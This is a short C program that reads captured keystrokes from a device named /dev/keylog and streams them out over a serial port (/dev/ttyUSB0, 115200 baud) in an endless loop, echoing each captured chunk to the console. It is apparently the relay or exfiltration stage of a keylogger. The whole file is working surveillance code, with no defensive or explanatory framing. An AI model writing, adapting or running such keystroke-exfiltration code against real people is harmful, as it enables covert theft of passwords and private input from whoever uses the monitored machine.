#include <stdio.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>

#define BUF_SIZE 128

int main() {
    int uart0 = open("/dev/ttyUSB0", O_RDWR | O_NOCTTY);
    if (uart0 < 0) {
        perror("UART open failed");
        return 1;
    }

    int fd = open("/dev/keylog", O_RDONLY);
    if (fd < 0) {
        perror("Failed to open /dev/keylog");
        close(uart0);
        return 1;
    }

    // UART configuration
    struct termios options;
    tcgetattr(uart0, &options);
    cfsetispeed(&options, B115200);
    cfsetospeed(&options, B115200);

    options.c_cflag &= ~PARENB; // No parity
    options.c_cflag &= ~CSTOPB; // 1 stop bit
    options.c_cflag &= ~CSIZE;
    options.c_cflag |= CS8;     // 8 data bits
    options.c_cflag |= (CLOCAL | CREAD); // Enable receiver

    options.c_lflag = 0;  // Raw input
    options.c_iflag = 0;
    options.c_oflag = 0;

    options.c_cc[VMIN] = 1;
    options.c_cc[VTIME] = 0;

    tcsetattr(uart0, TCSANOW, &options);

    char buf[BUF_SIZE];
    ssize_t n;

    printf("Listening for keystrokes from /dev/keylog and sending via UART (/dev/ttyUSB0)...\n");

    while (1) 
    {
        n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = '\0';  // Null-terminate just for safe printing
            printf("Captured: %s\n", buf);

           // Send only valid 'n' bytes over UART
            if (write(uart0, buf, n) < 0) {
                perror("UART write failed");
            } else {
                printf("Sent over UART: %.*s\n", (int)n, buf);
            }
        } else if (n < 0) {
            perror("Read failed from /dev/keylog");
            break;
        }

    }

   close(uart0);
    close(fd);
    return 0;
}

